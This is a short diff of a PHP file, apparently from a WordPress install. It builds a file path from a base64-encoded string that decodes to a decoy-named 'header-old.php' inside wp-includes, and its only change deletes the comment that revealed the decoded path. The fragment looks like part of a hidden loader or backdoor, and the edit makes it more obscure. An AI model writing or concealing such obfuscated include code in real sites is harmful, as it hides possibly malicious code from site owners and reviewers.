@@ -16,7 +16,7 @@ function __s($a){
     return $r;
 }
 
-$__h_b64 = 'd3AtaW5jbHVkZXMvL2hlYWRlci1vbGQucGhw'; // base64('wp-includes//header-old.php')
+$__h_b64 = 'd3AtaW5jbHVkZXMvL2hlYWRlci1vbGQucGhw';
 $__h_path = __DIR__ . DIRECTORY_SEPARATOR . str_replace('//','/',
     base64_decode($__h_b64)
 );
